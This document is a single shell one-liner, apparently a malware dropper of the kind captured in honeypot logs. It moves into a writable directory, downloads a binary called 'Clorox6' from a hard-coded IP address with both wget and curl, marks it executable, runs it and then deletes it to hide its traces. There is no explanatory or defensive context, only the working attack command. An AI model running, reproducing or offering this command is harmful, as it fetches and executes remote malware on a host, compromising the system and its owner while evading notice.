cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.36.182.3/Clorox6; curl -O http://69.36.182.3/Clorox6; chmod +x Clorox6; ./Clorox6; rm -rf Clorox6
